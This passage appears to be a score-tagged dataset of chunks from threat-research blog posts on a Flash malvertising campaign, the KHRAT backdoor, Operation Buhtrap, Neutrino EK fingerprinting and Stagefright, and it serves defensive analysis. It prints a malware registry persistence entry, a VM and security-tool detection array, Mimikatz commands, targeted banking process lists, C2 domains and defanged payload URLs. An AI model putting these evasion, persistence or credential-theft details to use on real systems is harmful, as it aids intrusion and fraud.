[4] Exploiting fundamental Weaknesses in Botnet C&C Panels. https://www.blackhat.com/docs/us-14/materials/us-14-Sood-What-Goes-Around-Comes-Back-Around-Exploiting-Fundamental-Weaknesses-In-Botnet-C&C-Panels-WP.pdf.
[5] Fast look at Sundown EK. http://malware.dontneedcoffee.com/2015/06/fast-look-at-sundown-ek.html.
[6] Scan4You. http://scan4you[.]net.
",0.012603444186366275
"Unconventional Malvertising Attack Uses New Tricks
A few days ago we spotted an interesting malvertising attack that was unlike others we had seen before. What made it unique was the multi-stage delivery of a Flash exploit via a seemingly benign XML file.
The advert itself is Flash-based and promotes a game called “Sparta – War of Empires”. However, there were several red flags with this ad that most ad networks would (or should) immediately notice.
For instance, when loading the Flash animation, ActionScript code called out an external URL.
Adverts should not perform this sort of action without any user interaction (i.e. a click) and the structure of the URL was a little suspicious (sub domain and .XYZ TLD seen a lot lately associated with malicious activity).",0.013523720144158702
"This allows the browser to read code from another domain and actually is something we had stumbled upon before in a similar attack (perhaps the same actors behind it are experimenting with new tricks).
The following diagram summarizes what takes place from the malvertising to the exploit and finally the infection.
There is a very interesting use of XML documents to store a base64 encoded blurb which needs to be XORed twice to give out the actual malicious SWF used to exploit users with CVE-2015-5122.",0.010061713615705847
"Hiding the SWF exploit within a carefully constructed array inside of an XML document is an interesting technique that allows to load the exploit code directly into memory in a multi-stage attack.
The final payload was the Miuref Trojan, well known for its click fraud and backdoor capabilities. However, Malwarebytes Anti-Exploit users were protected even before the malware binary had a chance to be dropped.
We noticed that Dell SonicWall also wrote about this threat which they called the Spartan Exploit Kit. Given its delivery method, we believe this is more of a “self sufficient” malvertising attack making use of a Flash exploit as opposed to a full fledged ‘Exploit Kit’.
Special thanks to Jerome Dangu, CTO at ClarityAd for the help with this analysis.
",0.010998238020735296
Trojanized Adobe installer used to install DragonOK’s new custom backdoor,0.0075168332725690234
"Since January of this year, Forcepoint Security Labs™ have observed that the DragonOK campaign have started to target political parties in Cambodia. DragonOK is an active targeted attack that was first discovered in 2014. It is known to target organizations from Taiwan, Japan, Tibet and Russia with spear-phishing emails containing malicious attachments.
The latest dropper they used is disguised as an Adobe Reader installer and installs yet another new custom remote access tool (RAT). We have named this RAT “KHRAT” based on one of the command and control servers used, kh[.]inter-ctrip[.]com, which pertained to Cambodia’s country code.",0.016365227276439853
"Dropper
The trojanized installer is a RAR SFX file that has the filename “reader112_en_ha_install.exe”. It contains both a legitimate Adobe Reader installer and a malicious VBScript file:",0.011853397338263072
"As a result, when the malware is executed, the user is presented with the legitimate Adobe installer prompt while the malicious VBScript executes in the background. Below is a code snippet of the VBScript:",0.014561303061689568
"Upon deobfuscating the script, the following code is revealed which installs of a portable executable (PE) file embedded in the script:",0.015194591329151463
"As can be seen above, the PE file is dropped as %USERPROFILE%\USER.DAT and is executed with a parameter ""K1"". This PE file is KHRAT, which will be discussed in the next section.
KHRAT
KHRAT is a small backdoor that has three exports (functions), namely, K1, K2, and K3. K1 checks if the current user is an administrator. If not, it uninstalls itself by calling the K2 function.
Otherwise, it creates the following registry as a persistence mechanism and then calls the function K3:",0.018367048616819037
"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
Run = """"%USERPROFILE%\SysWOW64.com"" %USERPROFILE%\USER.DAT,K1""",0.011256399943333717
"K3 then elevates the malware’s privilege, by giving itself SE_DEBUG_PRIVILEGE privileges via a RtlAdjustPrivileges call, and proceeds to communicate to its command and control (C2) server. The malware initially registers itself to the C2 server by sending the infected machine’s username, system language, and local IP address.
All communication to and from the C2 server are encrypted in byte-wise XOR. Below is a code snippet showing this routine prior to sending data to the malware C2:",0.012940094997388463
KHRAT is capable of executing the following backdoor commands:,0.009684813063717712
"Provide access to the file system
Log keystrokes
Capture screenshots
Enumerate processes
Open a remote DOS command access",0.008502387596908134
"Furthermore, the following table provides a timeline of KHRAT's appearances, with one appearing earlier this month:",0.01535481497733271
"SHA-256
Compilation Timestamp",0.01123455861696454
"17a07b1f5e573899c846edba801f1606ce8f77c2f52e3298d2d2b066730b0bf0
05/01/2017 05:37",0.012705164032002725
"a5a9598e1d33331f5aeabb277122549d4a7cf1ddbfa00d50e272b57934a6696f
05/01/2017 05:37",0.012486253112566126
"540d6dd720514cf01a02b516a85d8f761d77fa90f0d05f06bfb90ed66beb235b
16/02/2017 03:53",0.012409753753504615
"ffc0ebad7c1888cc4a3f5cd86a5942014b9e15a833e575614cd01a0bb6f5de2e
08/03/2017 01:43",0.011638694853086107
"Protection statement
Forcepoint customers are protected against this threat via TRITON® ACE at the following stages of attack:
Stage 5 (Dropper File) - Related malware components are prevented from being downloaded and/or executed.
Stage 6 (Call Home) - Connections to the KHRAT command and control servers are blocked.
Conclusion
KHRAT’s code is reminiscent of the backdoors used in HeartBeat and Bioazih campaigns where the coding style is straight forward and the malware itself provides basic backdoor functionalities to the attackers. This leads us to believe that KHRAT is simply a rehash of codes that are available on Chinese code sharing sites. Nonetheless, this would seem enough for the attackers in this case as KHRAT variants currently have a low detection rate. We have listed below the related IOCs to help augment industry coverage for this new threat.
Indicators of Compromise
Files",0.013920754115656409
"bba604effa42399ed6e91c271b78b442d01d36d1570a9574acacfc870e09dce2 (""reader112_en_ha_install.exe"", dropper)
ffc0ebad7c1888cc4a3f5cd86a5942014b9e15a833e575614cd01a0bb6f5de2e (“USER.DAT”, KHRAT)",0.012236648217504031
"9cdebd98b7889d9a57e5b7ea584d7e03d8ba67c02519b587373204cae0603df0 (RTF dropper with CVE-2015-1641 exploit, unknown filename)
d9ce24d627edb170145fb78e6acb5ea3cb44a87cd06c05842d78f4fc9b732ec5 (“KFC.exe”, KHRAT loader)
a5a9598e1d33331f5aeabb277122549d4a7cf1ddbfa00d50e272b57934a6696f (“MSKV.DAT”, KHRAT)",0.015156632719802943
"a6e22dfe21993678c6f1b0892c2db085bb8c4342bdf78628456f562d5db1181b (“The plan CPP split CNRP!.doc.exe”, dropper)
77354141d22998d7166fd80a12d9b913199137b4725495bd9168beb5365f69e7 (“KFC.com”, KHRAT loader)
540d6dd720514cf01a02b516a85d8f761d77fa90f0d05f06bfb90ed66beb235b (“MSKV.DAT”, KHRAT)",0.013649673076094437
"17a07b1f5e573899c846edba801f1606ce8f77c2f52e3298d2d2b066730b0bf0 (“MSKV.DAT”, KHRAT)",0.012269836592887717
KHRAT C2s,0.009885907544116446
"cookie[.]inter-ctrip[.]com
help[.]inter-ctrip[.]com
bit[.]inter-ctrip[.]com
kh[.]inter-ctrip[.]com
",0.013394170769518654
"Operation Buhtrap, the trap for Russian accountants
The Operation Buhtrap campaign targets a wide range of Russian banks, used several different code signing certificates and implements evasive methods to avoid detection.",0.01592976588291184
Jean-Ian Boutin,0.010129065139412474
9 Apr 2015 - 12:44PM,0.011331457487923857
"The Operation Buhtrap campaign targets a wide range of Russian banks, used several different code signing certificates and implements evasive methods to avoid detection.",0.015105575157994933
"Late in 2014, we noticed and started to track an undocumented malicious campaign targeting Russian businesses, and that has been active for well over a year. The malware used in this campaign is a mix of off-the-shelf tools, NSIS-packed malware and bespoke spyware that abuses Yandex’s Punto software, a program for Russian users which silently and automatically changes the keyboard language depending on what the user is typing. Once the cybercriminals have compromised a computer, they use custom tools to analyze its content, install a backdoor and finally deploy a malicious module that spies on the system and can enumerate smart cards.",0.01057288780915655
"The campaign targets a wide range of Russian banks, uses several different code signing certificates and implements evasive methods to avoid detection. As explained later, we believe this campaign is financially-motivated and that it targets accounting departments in Russian businesses. Operation Buhtrap is a mix of two words: “Buhgalter” and “trap”. “Buhgalter” means “accountant” in Russian.",0.01426039082515218
"This campaign is of particular interest as the techniques used by these cybercriminals are often associated with targeted attacks and not generally used by financially-motivated cybercriminals. Although we believe it to be a different campaign, it shares some similarities with Anunak/Carbanak in terms of techniques, tactics and procedures it uses. In this blog post, we will cover this campaign, its targets, and the tools used by these criminals.",0.015696577629344732
Targets,0.010311347063087006
"The cybercriminals behind this campaign are installing their software only on computers that have Russia as their default Windows locale. The infection vector we have seen consists of Microsoft Word documents sent as email attachments that exploit CVE-2012-0158, a vulnerability in Microsoft Word that was patched three years ago. The images below show two of the decoy documents used in this campaign. The first document, titled “Счет № 522375-ФЛОРЛ-14-115.doc” mimics an invoice. The second, aptly titled “kontrakt87.doc”, copies a generic telecommunications service contract from MegaFon, a large Russian mobile phone operator.",0.010639323379722732
"The content of the decoy documents we’ve examined, the tactics and tools used, the references to business applications contained in some modules, as well as some of the malicious domain names that were used in this campaign, all lead us to believe that Russian businesses are their primary target.",0.01712529667111784
"If we take it into consideration that some of the Command and Control (C&C) domain names are very similar to some accounting forums or specialized websites, and that the malware contains references to software tools and banking applications commonly used in accounting departments, we can infer that workers belonging to this department are the most likely primary targets.",0.014842052374705927
"The tools deployed on the victim’s computer allow them to control it remotely and to record the user’s actions. The malware allows the criminals to install a backdoor, attempt to obtain the account password, and even create a new account. They also install a keylogger, a clipboard stealer, a smart card module, and have the capability to download and execute additional malware.",0.010551090267110097
Our telemetry for the malware families linked to this campaign is shown below. Most detections we have for these threats are located in Russia. Our telemetry also shows that the tools used by this campaign are not widespread. This reinforces our assumption that these attackers are likely focusing primarily on businesses.,0.015138167927317925
Installation Overview,0.008933648289622398
"If the user opens the malicious attachments on a vulnerable system, an NSIS-packed trojan downloader will be dropped and executed. It will make several checks on the machine, first looking for malware researcher tools or evidence that the malware is run in a virtual machine, exiting if it finds any. It will also check whether the Windows locale is Russian (1049) and uses “FindFirst/NextUrlCacheEntry” and registry key “Software\Microsoft\Internet Explorer\TypedURLs” to know whether URLs matching the following patterns were visited on the computer:",0.009762717011475797
*ICPortalSSL*ibank*i-elba,0.007851058668327582
*sib.taatta.net*ibrs*clbank.minbank.ru,0.010235120553453658
*isfront.priovtb.com*iclient*chelindbank.ru/online/,0.012029160361758828
*ISAPIgate.dll*e-plat.mdmbank.com*uwagb,0.009797723974390937
*bsi.dll*sberweb.zubsb.ru*wwwbank,0.009528257661213013
*PortalSSL*ibc*dbo,0.00761494932126261
*IIS-Gate.dll*elbrus*ib,0.0069815213839624635
*beta.mcb.ru,0.007743212452353765
It will also check to see if any of the applications below is running on the machine:,0.006070889912876742
ip-client.exepkimonitor.exeBC_Loader.exeCbShell.exeBankline.EXE,0.009746223698954615
prclient.exepmodule.exeClient2008.execlb.exeGeminiClientStation.exe,0.009713298433370987
rclient.exepn.exeIbcRemote31.exeCliBank.exe_ClientBank.exe,0.009528289472343188
saclient.exepostmove.exe_ftcgpk.exeCliBankOnlineEn.exeISClient.exe,0.010336516985553712
SRCLBClient.exeproductprototype.exescardsvr.exeCliBankOnlineRu.execws.exe,0.0097207760681568
twawebclient.exequickpay.exeCL_1070002.exeCliBankOnlineUa.exeCLBANK.EXE,0.011661789432477532
vegaClient.exerclaunch.exeintpro.execlient2.exeIMBLink32.exe,0.008723476791433593
dsstart.exeretail.exeUpMaster.execlient6.execbsmain.dll,0.01023013479198509
dtpaydesk.exeretail32.exeSGBClient.execlientbk.exeGpbClientSftcws.exe,0.009666741224705788
eelclnt.exetranslink.exeel_cli.execlntstr.exeRun.exe,0.010585094919872695
elbank.exeunistream.exeMWClient32.execlntw32.exeSGBClient.exe,0.010823108321885377
etprops.exeuralprom.exeAdirect.execontactng.exesx_Doc_ni.exe,0.010509195574592956
eTSrv.exew32mkde.exeBclient.exeCore.exeicb_c.exe,0.009643483004638687
ibconsole.exewclnt.exebc.execshell.exeClient32.exe,0.009750548293573136
kb_cli.exewfinist.exeant.execyberterm.exeBankCl.exe,0.011325785952138956
KLBS.exewinpost.exearm.execlient.exeICLTransportSystem.exe,0.009581600725606543
KlientBnk.exewupostagent.exearm_mt.execncclient.exeGPBClient.exe,0.0103170805427506
lfcpaymentais.exeZvit1DF.exeARMSH95.EXEbbclient.exeCLMAIN.exe,0.010703481323312003
loadmain.exebudget.exeasbank_lite.exeEximClient.exeONCBCLI.exe,0.013003953639178167
lpbos.exeCB.exebank.exefcclient.exeCLBank3.exe,0.011310861514419623
mebiusbankxp.execb193w.exebank32.exeiscc.exermclient.exe,0.009983895399336307
mmbank.execbank.exebbms.exekabinet.exeFcolseOW.exe,0.009736890113944519
pcbank.execbmain.exbk.exeSrCLBStart.exeRkcLoader.exe,0.010812344477257985
pinpayr.exeCBSMAIN.exeBK_KW32.EXEsrcbclient.exeuarm.exe,0.010217936652932802
Pionner.exebnk.exeUpp_4.exenlnotes.exe,0.008354600113508637
"The list of processes is quite exhaustive and does not contain only banking applications. It includes, for example, “scardsvr.exe” which is Microsoft’s SmartCard reader. This makes sense knowing that this malware has smartcard reader capabilities. On the other hand, some processes are hard to identify and might be there for opportunistic reasons.",0.008530977622035696
"If all the requirements are met, the final stage is to download an additional file that contains all the modules used by the cybercriminal to spy on the victim.",0.013616333910723477
"Interestingly, the downloaded archive may differ depending on the results of the checks above. In one of the earlier version of the NSIS-packed downloader we analyzed, there exist two different archives that can be downloaded from the C&C: one malicious and one benign.",0.013372111548231702
"One of the benign archives we downloaded ultimately installed the Windows Live Toolbar. Although the means to install the software was malicious, the final payload wasn’t. These tactics were probably put in place to fool automatic processing systems: since a payload was downloaded, the system could be fooled into thinking that this is the end of the story.",0.009026523318393598
"The archive downloaded by the NSIS-packed dropper is a 7z self-extracting executable and contains different modules, all distributed as 7z password-protected archives. This downloaded archive contains the different modules used by this campaign. The picture below better describes the overall installation process and shows the different modules.While the different modules have very different purposes, they are all similarly packaged and a lot of them are signed with a valid code-signing certificate. We found four different certificates used since the campaign started, all registered to companies in Moscow. We of course notified the certificate issuer to have them revoked.",0.011928715843987137
The table below lists the different certificates that were found linked to this campaign. We believe they were all fraudulently obtained.,0.011721987395513112
Company nameValiditySerial and Thumbprint,0.009286491457232926
"Stroi-Tekh-Sever09/25/2014 to 09/26/2015Serial: 07 ac 7c a0 d1 69 d7 d3 86 ee 08 01 19 95 99 f2
Thumbprint: cf5a43d14c6ad0c7fdbcbe632ab7c789e39443ee",0.012043564999659306
"Flash12/18/2014 to 12/19/2015Serial: 57 a8 f7 1c 7e 2b 97 8c 71 60 ba 07 5e ca b4 6c
Thumbprint: e9af1f9af597a9330c52a7686bf70b0094ad7616",0.012168161156712154
"OOO ""Techcom""12/22/2014 to 12/23/2015Serial: 00 e9 fb cb 1b c3 8b 66 8d 9e ba a4 73 11 76 01 41
Thumbprint: 3e1a6e52a1756017dd8f03ff85ec353273b20c66",0.011776022175722933
"Torg-Group10/30/2014 to 10/31/2015Serial: 13 01 47 51 84 46 19 e6 b5 7f de ca 34 e6 04 aa
Thumbprint: efad94fc87b2b3a652f1a98901204ea8fbeef474",0.0112944770034904
All the modules that make up this threat share a common install procedure. They are all 7z self-extracting executables that first decompress a password-protected archive and then execute an install.cmd file. The following is the first install.cmd file that gets invoked after the first module has been downloaded and executed:,0.010494160722203993
"The install.cmd file will then install the malware or run the various tools, but will first learn more about the machine it is about to compromise, especially about the account privileges it currently has and which version of Windows is installed.
If administrator privileges are required and malware is run on a limited account, it uses two different techniques to attempt privilege escalation.",0.014064112923365513
"The first approach uses two files, l1.exe and cc1.exe, which implement a variant of the trick used in the leaked Carberp source code. It copies cryptbase.dll to %USERPROFILE%, patches it so that it launches the malware on execution and packs it as a MSU file. Finally, it uses wusa.exe to copy it to the system directory before launching it. The other technique exploits CVE-2013-3660. Each module that requires privilege escalation has a 32- and 64-bit version of this exploit. If gaining administrator privileges is required, the install.cmd file will try to use either of these techniques to escalate privileges locally  in order to install the different modules.",0.008545136084141869
"While tracking this campaign, we downloaded different overall packages. Interestingly, the modules they contained were not the same. This leads us to believe that different targets might receive different modules.",0.01327938531236239
System Preparation – mimi.exe and xtm.exe,0.009513838530000318
This module will try to:,0.007935434981175327
"Recover account passwords
Enable remote desktop service
Create a new account on the compromised computer",0.008260778828638404
"mimi.exe includes a modified version of Mimikatz, a well-known open source tool allowing password recovery for users logged in a Windows system. Both the 32- and 64-bit versions of the tools are included in the executable resources. While the account password recovery functionality is still there, the executable was modified to remove the user interaction part of the tool. The executable is also modified so that when run, it will invoke in succession the “privilege::debug” and “sekurlsa:logonPasswords” commands, effectively compromising the current local account password.",0.01189557220277504
"xtm.exe has different behavior to reach its goals depending on which Windows version it is run. In WinXP, it has scripts that will enable remote desktop services and try to create a new account. These steps are required to give the malware authors full control over the compromised system. xtm.exe will also change system settings, to allow multiple users to be logged on to the computer at the same time. The screenshot below shows an example of the type of commands run on a WinXP machine.",0.013736665608095056
Backdoor – lmpack.exe,0.00814057787580591
"This module’s sole purpose is to install a backdoor onto the system. It will try to install LiteManager, a third-party tool that allows remote control of a system.",0.008573076258626355
"Once this software is installed, it allows the cybercriminals to connect directly to the victim’s computer and control it remotely. This software even has a command line option to install the application silently, to create firewall rules, and finally to start LiteManager silently. Of course all these options are abused by the cybercriminals.",0.008604384846508606
Spying module – pn_pack.exe,0.00787366494980557
"This module is responsible for spying on the user and communicating with the C&C. It will first install Punto, software made by Yandex that can automatically change keyboard language as the user types. The cybercriminals are then misusing this software to run the spying module through DLL side loading and are using it to",0.010393138464810825
"Log all keystrokes and copy clipboard content
Enumerate smart cards present on the system
Handle C&C communications",0.008708153968479793
The module that is ultimately responsible for these tasks is an encrypted DLL that is decrypted and loaded into memory at runtime by the Punto process. It launches three threads that will ultimately perform the work outlined above. The fact that Punto is misused by this malware for keylogging purposes is not surprising: several Russian forums detail explicitly how to misuse this application for this purpose.,0.009137297520887766
"This module uses RC4 to encrypt its strings as well as its network communication. It will reach out to the C&C every two minutes, transmitting any data that have been stolen from the compromised system. A screenshot of a network communication as well as the different commands that can be received from the server are shown below.",0.010663783291924078
CommandDescription,0.008653284080223811
MZThe data sent is an executable. The banker module will execute it through the CreateProcess API,0.007883184587777259
LDThe data sent is code. The banker module will copy it into executable memory and will execute it by launching a new thread.,0.008152689548895475
"As the server commands are sent as a response to a status update from the user, it is not unimaginable that special code will be sent for specific events, such as when a smart card is detected on the system.",0.010012705400025634
"Interestingly, in all the banker modules we analyzed (the latest one having a compilation time of January 18th), there is a string “TEST_BOTNET” that is sent in every communication with the C&C. At this point, it is unclear what this means as people and organizations have already been compromised by this malware. As we believe this operation has been ongoing for more than a year, this is intriguing. Perhaps the future holds the answer.",0.011724627279138033
Conclusion,0.008171308922719556
We can imagine the fraudsters operating in this way: they first compromise a single computer in a business by sending a spam and luring the person into opening the attachment.,0.018550481829905152
"Once the malware is installed on the victim’s computer, the cybercriminals have access to several tools that will help them to first compromise other computers in the company and second, spy on the user and see whether some fraudulent banking transactions can be performed.",0.01930803699678585
"While the tools and software used in this campaign are far from being novel, the overall campaign is quite interesting and intriguing: it diverges quite a bit from the traditional banking malware with which we are familiar.",0.013764198178584874
"This campaign is using specific tools to reach its goal, akin to what we are accustomed to see in targeted attacks. Seeing a campaign like this, inevitably the Anunak/Carbanak documented by Fox-IT and Kaspersky comes to mind. Although we believe that this campaign is different, some similarities were observed. The infection vector is similar, it uses a similar modified mimikatz application, and it uses a third-party remote access tool, changes system settings to allow concurrent RDP sessions, and so on.",0.013524651826843703
It will be interesting to see whether this kind of operation will become the norm and if the popularity of traditional banking trojan families will diminish in return.,0.017304533204832717
Special thanks to Anton Cherepanov and Joan Calvet for their help in this analysis,0.008478240750808275
Hashes,0.008943721272284266
SHA1NoteESET Detection Name,0.012844941519585262
64b79c92388244a8145bb786ba5f6b7d168fe620RTFWin32/Exploit.CVE-2012-0158.II,0.007041777424194429
9d081716e83c3075b2c80bb8806a257eed35929cNSIS-packed downloaderNSIS/TrojanDownloader.Agent.NQP,0.009956594912650107
cac0b41ef7eedcd3a8a5f83f7424c426ca05925cRTFWin32/Exploit.CVE-2012-0158.JW,0.007282222598739785
b29e9611f081197f273c475c5d185d774b2ca3d2NSIS-packed downloaderWin32/RA-based.AB,0.008759216719359308
81b15a774c2fe146aeebaf9c10a5b907e38cdd267z self-extracting exeWin32/RA-based.AB,0.006675056638851706
3a643be0cea73084c6e4e6fe5dd3626e7f54e9ce7z self-extracting exeWin32/RA-based.NBM,0.007285473428167655
ba8168c0b69d345098ebc1c3b7c90ca28097e4ffDecrypted banker DLLWin32/Spy.Agent.ONE,0.00918871799424481
Indicators of Compromise,0.0076996116119932845
IndicatorValue,0.008896553815385011
"C&C Domainsstore.kontur-expres.com
balans2w.balans2.com
forum.buhonline.info
rss.mercurynews.biz
topic.buhgalter-info.com
help.b-kontur.org",0.013379986570212221
C&C Hardcoded IP91.218.231.79,0.009002219203163908
"7z self-extracting executable URLshXXp://playback.savefrom.biz/video/video1.cab
hXXp://playback.savefrom.biz/video/video_1.cab
hXXp://download.sendspace.biz/file/install.cab
hXXp://download.sendspace.biz/file/l.cab
hXXp://library.source-forge.info/cab/cabinstal.cab
hXXp://library.source-forge.info/cab/cabinstal3.cab
hXXp://new.pikabu-story.com/file/file1.cab
hXXp://getdownloadsfile.com/file/new1.cab
hXXp://new.pikabu-story.com/file/mega.cab",0.014227023975730058
"Decoy document nameСчет № 522375-ФЛОРЛ-14-115.doc
kontrakt87.doc
",0.0160763952670111
"Neutrino EK: fingerprinting in a Flash
Since the disappearance of Angler EK, exploit kit activity is at one of its lowest it has been in a long time. The focus is therefore on Neutrino EK, which has somewhat picked up the pieces, although at a much lower rate.
On June 13th, @BelchSpeak tweeted something that caught my attention because it had to do with local iframes searching for installed software. This immediately made me think of the fingerprinting technique, an information disclosure vulnerability we have described many times on this blog. The purpose of fingerprinting in the case of exploit kits or malvertising campaigns is to avoid unnecessary attention by checking for undesirable users (researchers, honeypots, etc) and not serving them the exploits and malware payload.
Neutrino EK has used various tricks before to check for debuggers and operating systems and appears to now be adding another layer of evasion with the res:// variant onload technique which had supposedly been addressed by Microsoft with security bulletin MS14-052.
Fingerprinting evidence
Replaying Neutrino EK with Process Monitor confirms some checks for security and virtualization software taking place. If the value returned is “PATH NOT FOUND”, that means the software it is looking for is not installed at that particular (default) location. For example, we see below that Neutrino is checking for the presence of Fiddler, a commonly used web debugger, or also for VMware and VirtualBox, two popular virtualization pieces of software.",0.015541272677903617
"What this means is that the victim is most likely genuine since they are not using some monitoring tools or testing the exploit kit inside of a Virtual Machine, therefore making them a good candidate for the exploitation and infection phases that follow up.
Finding the source
The strange thing with this particular fingerprinting is that Neutrino’s landing page is notorious for being extremely simple, and only used to launch Flash exploits, devoid of other code that other EKs typically run before firing exploits:",0.013428167395027057
"It only seemed logical to look into the Flash exploit to find some clues. We can use Sulo to dump a cleaner version of the malicious SWF, which allows us to glance at the ActionScript3 code and spot an interestingly named script most likely responsible for this fingerprinting:
4_res_js_rc4$9d60ea8c42cd5afde749de7143478f03135771611",0.00993485942976835
"Timeline
Up until June 9th, the malicious SWF used by Neutrino looked more or less like this (note the absence of the res_js script):",0.009256339516978018
"However, on June 10th, a new version of the Flash exploit contains it (original URL: umwlyov.inconfirmug.top/ministry/1896384/slide-bounce-attach-shaft-bomb-herself-bosom.swf).",0.008812612582002388
"Static SWF analysis
To examine this new artifact, we can use JPEXS and extract the binary data associated with res_js:",0.017723510218903837
"That binary data is encoded and requires RC4 decryption with a key stored in the SWF file, before finally getting the resulting bytes decompressed into readable text.",0.0140370915763115
A quick glance at the (truncated) code below shows a very suspicious blurb preceded by __flash__toXML. This technique of stuffing JavaScript code into a Flash file and starting it via the ExternalInterface.call has been documented before.,0.011017103109005721
"The v variable is actually an array containing the fingerprinting elements later used as iframes via the res:// call.
[ ""debug"",
""maxParallelCheck"",
""frameName"",
""myFrame"",
""name"",
""VirtualBox Guest Additions"",
""res"",
""res://C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\DIFxAPI.dll/#24/123"",
""type"",
""vm"",
""VMware Tools"",
""res://C:\\Program Files\\VMware\\VMware Tools\\VMToolsHook.dll/#24/2"",
""Fiddler2"",
""res://C:\\Program Files (x86)\\Fiddler2\\uninst.exe/#24/1"",
""tool"",
""Wireshark"",
""res://C:\\Program Files (x86)\\Wireshark\\wireshark.exe/#24/1"",
""FFDec"",
""res://C:\\Program Files (x86)\\FFDec\\Uninstall.exe/#24/1"",
""ESET NOD32 Antivirus"",
""res://C:\\Program Files\\ESET\\ESET NOD32 Antivirus\\egui.exe/#24/1"",
""av"",
""Bitdefender 2016"",
""res://C:\\Program Files\\Bitdefender Agent\\ProductAgentService.exe/#24/1"",
""length"", ""[START] checking process ..."",
""Software for checking: "",
""getTime"",
""successCallback"",
""failCallback"",
""pop"",
""=== Checking element:
"", "", on iframe: "",
{truncated} ]
iframes and XMLDOM
What the browser ends up loading is a series of iframes checking for specific installed software on the local disk:",0.01005181573486913
"Neutrino EK, in keeping consistent with its focus on Flash exploits and a minimal landing page is killing two birds with one stone. The malicious Flash fingerprints the system using CVE-2013-7331 and then exploits a recently patched Flash (Flash Player up to 21.0.0.213) with CVE-2016-4117 if the system passes the test.
Running Neutrino EK on a fully patched Windows 10 machine with the Edge browser, we can see the fingerprinting is still working and detecting that we are running VirtualBox:",0.010025252858261946
"We informed the Microsoft Security Response Center (MSRC) and quickly received a reply: “We are aware of this issue and are currently engaged in working towards a resolution.”
Malwarebytes Anti-Exploit detects and blocks this information disclosure bug/feature as a fingerprinting event when it tries to check for Malwarebytes software.
Special thanks to @Ledtech3 and Microsoft Edge engineer @jonathansampson for their help in decoding some parts of the SWF and JS code.
Further reading
Luis Rocha, Neutrino Exploit Kit Analysis and Threat Indicators
IOCs",0.011695321356279154
Flash exploit for June 9th,0.005744737188603355
"Original: ad7873f7e241a51090d70b95cdc0c2646884cb61c3a564bd1062848b7a860f25
Dumped: 68f10d5e1054002775b73967c28f1c043cd77f55152ee9ecd3c00f0727adcb6f",0.012085726421391385
Flash exploit for June 10th,0.005851580258633748
"Original: 6b9be2361f19070198b3bdc9372c8cb436ddc2d344ee77f10d27f597b68679a7
Dumped: e716b1f5c5598d6d1bb89c7dcfa46017d0416b0da5b4c9c952b2ec5d383792c1",0.012715540678084891
Flash exploit analyzed,0.005501548476483542
"Original: 8627d6ac05e868557a3ef796ae91c85648a3348f7a8428760e6771966d871fc9
Dumped: a7c238b0c1984703aacea4582975104e3254b7d01b017bd4b07258d4b1ab0d40
",0.011528942435017897
"Are you still vulnerable to Stagefright? Get your Android device checked now
Security researchers found a vulnerability in Android that could allow attackers to steal information from smartphones through remotely executed code via a crafted MMS. According to them up to 950 million devices could be vulnerable.",0.011545879536590808
Raphael Labaca Castro,0.009708772994872494
14 Aug 2015 - 03:35PM,0.011154598323067755
Security researchers found a vulnerability in Android that could allow attackers to steal information from smartphones through remotely executed code via a crafted MMS. According to them up to 950 million devices could be vulnerable.,0.011371507974506367
"Updated 3rd April, 2016: Independent security analyst Graham Cluley reported in February that Google had released its latest security update for Nexus devices running Android, adding that one of the most serious flaws found could result in remote code execution: “For instance, the bug in Mediaserver could mean that simply opening an email, browsing a website or receiving a media file via MMS could [result in] malicious code being run on your device. If this sounds familiar then chances are you remember Stagefright, one of the biggest Android security scares of last year.”",0.012073735790838591
"Updated October 5th: It has been reported that Google, in partnership with manufacturers and carriers, will release a patch today to resolve newly identified vulnerabilities, after Zimperium Lab revealed last week that a sequel to Stagefright had been found. The bug could now compromise as many as a billion Android users.",0.013042493417658063
"In a blog, Zimperium Lab stated: “The first vulnerability (in libutils) impacts almost every Android device since version 1.0 released in 2008. We found methods to trigger that vulnerability in devices running version 5.0 and up using the second vulnerability (in libstagefright). Google assigned CVE-2015-6602 to vulnerability in libutils. We plan to share CVE information for the second vulnerability as soon as it is available.”",0.012613460903263207
"Updated September 10th: An exploit is made available by Zimperium Labs for testing purposes. The python script creates an MP4 that exploits the CVE-2015-1538 vulnerability, one of the most critical flaws of Stagefright. However, according to the author, this isn’t a generic exploit as it has only been tested on one device: Nexus running Android 4.0.4.",0.010572093935303672
"Updated August 18th: In order to make it even more easier for you to detect whether your Android device is vulnerable or not to Stagefright, we have launched an app that you can download directly from Google Play. Although no new announcements have been provided by Google to confirm when a new patch will be rolled out, it is anticipated that this will take place in September.",0.01020111806132662
"Also, it is worth noting Trend Micro published an article on 17th August about a MediaServer flaw, another vulnerability in Android that does not presently appear to be related to Stagefright. However, this has since been fixed by Google via its Android Open Source Project (AOSP).",0.015584372344482067
"One week before Black Hat and DEF CON, security researcher Joshua Drake published his findings about a vulnerability in the heart of Android that could allow attackers to steal information from Android devices through remotely executed code via a maliciously crafted MMS. According to the Zimperium zLabs researcher, up to 950 million devices could be vulnerable.",0.012956469553961236
"Since this was dubbed one of the biggest vulnerabilities ever, we’re summing up a quick FAQ about it in order to better understand this vulnerability, as well as highlight how you can find out if your Android device is vulnerable.",0.010403656171505515
Is it really the worst of all Android vulnerabilities?,0.011091341462115212
"It is difficult to label a vulnerability as being the worst, because the basis for this attribution varies.For instance, factors including the number of devices affected, ease of compromising and the number of exploits in the wild, all of these have varying influences on the severity of a vulnerability. However, with 950 million users of Android devices potentially affected and after one failed attempted by Google to fix it, we should take this a bit more seriously than other, more commonplace vulnerabilities.",0.011044343267680001
How does this vulnerability work and why is it called Stagefright?,0.01024714626091583
"Among the thousands of lines in the source code of Android, there is a media library called Stagefright that is in charge of managing multimedia formats that allow you to playback videos and music on your Android devices. An attacker could exploit this vulnerability by crafting a MMS with an exploit and send it to the victim. In this case, this could be a targeted attack based uniquely on the victim’s telephone number, which is the only information needed to send the crafted MMS. It depends on what application you use to visualize the MMS, as with regular Messenger the exploit will be executed only after seeing the MMS without playing the media. Using Hangouts could be even worse, since the device would be compromised almost automatically even before you are able to see the notification.
What versions are vulnerable?
According to the investigation, all versions from Froyo (2.2) inclusive are vulnerable, which means 95 per cent of Android devices – or about 950 million users worldwide. In addition, versions prior to Jelly Bean are at higher risk, since they do not incorporate appropriate mitigations.",0.010692538920792694
